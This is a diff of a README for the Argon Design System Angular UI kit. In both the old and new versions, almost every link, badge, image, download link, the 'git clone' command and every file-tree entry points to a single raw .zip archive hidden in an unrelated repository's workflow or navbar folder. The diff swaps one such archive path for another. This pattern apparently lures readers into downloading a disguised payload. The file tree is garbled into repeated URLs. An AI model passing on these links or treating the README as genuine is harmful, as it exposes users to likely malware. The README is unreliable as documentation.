@@ -1,8 +1,8 @@
-# [Argon Design System Angular](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip) [![Tweet](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip%20Design%20is%20a%20Free%20Bootstrap%20and%20Angular%20Design%20Sysyem%20made%20using%20angular-cli%20%E2%9D%A4%EF%B8%8F%0Ahttps%https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip%20%23angular%20%23angular-cli%20%23argon%20%23argondesign%20%23angular%20%23argonangular%20%23angulardesign%20%23bootstrap%20%23design%20%23uikit%20%23freebie%20%20via%20%40CreativeTim)
+# [Argon Design System Angular](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip) [![Tweet](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip%20Design%20is%20a%20Free%20Bootstrap%20and%20Angular%20Design%20Sysyem%20made%20using%20angular-cli%20%E2%9D%A4%EF%B8%8F%0Ahttps%https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip%20%23angular%20%23angular-cli%20%23argon%20%23argondesign%20%23angular%20%23argonangular%20%23angulardesign%20%23bootstrap%20%23design%20%23uikit%20%23freebie%20%20via%20%40CreativeTim)
 
 
 
- ![version](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)  ![license](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip) [![GitHub issues open](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip%3Aopen+is%3Aissue) [![GitHub issues closed](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip%3Aissue+is%3Aclosed) [![Join the chat at https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip) [![Chat](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip%https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)
+ ![version](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)  ![license](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip) [![GitHub issues open](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip%3Aopen+is%3Aissue) [![GitHub issues closed](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip%3Aissue+is%3Aclosed) [![Join the chat at https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip) [![Chat](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip%https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)
 
 **Fully Coded Components**
 
@@ -12,7 +12,7 @@ Every element has multiple states for colors, styles, hover, focus, that you can
 
 **Complex Documentation**
 
-Each element is well presented in a very complex documentation. You can read more about the idea behind this [kit here](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip). You can check the [components here](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip) and the [foundation here](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip).
+Each element is well presented in a very complex documentation. You can read more about the idea behind this [kit here](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip). You can check the [components here](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip) and the [foundation here](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip).
 
 **Example Pages**
 
@@ -34,38 +34,38 @@ If you want to get inspiration or just show something directly to your clients, 
 
 ## Versions
 
-[<img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip" width="60" height="60" />](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)[<img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip" width="60" height="60" />](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)[<img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip" width="60" height="60" />](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)
+[<img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip" width="60" height="60" />](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)[<img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip" width="60" height="60" />](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)[<img src="https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip" width="60" height="60" />](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)
 
 
 
 | HTML | Angular | Vue  |
 | --- | --- | ---  |
-| [![Argon Design System HTML](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)  | [![Argon Design System Angular](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)  | [![Vue Argon Design System](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)
+| [![Argon Design System HTML](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)  | [![Argon Design System Angular](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)  | [![Vue Argon Design System](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)
 
 
 ## Demo
 
 | Buttons | Inputs | Navbars  |
 | --- | --- | ---  |
-| [![Buttons](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)  | [![Inputs](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)  | [![Navbar](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)  
+| [![Buttons](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)  | [![Inputs](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)  | [![Navbar](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)  
 
 | Login Page | Landing Page | Profile Page  | Register Page  |
 | --- | --- | ---  | ---  |
-| [![Login Page](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)  | [![Landing Page](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)  | [![Profile Page](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)  | [![Register Page](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)  
+| [![Login Page](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)  | [![Landing Page](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)  | [![Profile Page](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)  | [![Register Page](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)  
 
-[View More](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip)
+[View More](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip)
 
 
 
 ## Quick start
 
-- [Download from Github](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip).
-- [Download from Creative Tim](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip).
-- Clone the repo: `git clone https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip`.
+- [Download from Github](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip).
+- [Download from Creative Tim](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip).
+- Clone the repo: `git clone https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip`.
 
 
 ## Documentation
-The documentation for the Argon Design System Angular is hosted at our [website](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip).
+The documentation for the Argon Design System Angular is hosted at our [website](https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip).
 
 
 ## File Structure
@@ -73,144 +73,144 @@ Within the download you'll find the following directories and files:
 
 ```
 argon-design-system-angular
-├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 ├── e2e
-├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 ├── src
 │   ├── app
-│   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   ├── home
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   ├── landing
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   ├── login
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   ├── profile
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   ├── sections
 │   │   │   ├── alerts-section
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   │   ├── angular-section
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   │   ├── buttons-section
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   │   ├── crs-section
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
-│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
+│   │   │   │   └── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/src/app/shared/navbar/and_github_app_you_io_me_v3.1.zip
 │   │   │   ├── inputs-section
-│   │   │   │   ├── https://github.com/vikasoni12/you-and-me-app.github.io/raw/refs/heads/master/.github/workflows/you-and-github-app-io-me-2.7.zip
